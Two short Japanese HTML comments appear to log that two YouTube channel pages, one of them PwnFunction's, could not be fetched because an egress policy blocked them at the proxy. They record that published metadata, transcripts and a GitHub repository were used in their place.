<!-- self-read: https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w | egressポリシーでYouTubeがプロキシに遮断され自動取得できず、本人公開のメタデータ・トランスクリプトで代替 -->
<!-- self-read: https://www.youtube.com/c/PwnFunction/videos | egressポリシーでYouTubeがプロキシに遮断され自動取得できず、メタデータと公式GitHubリポジトリで代替 -->
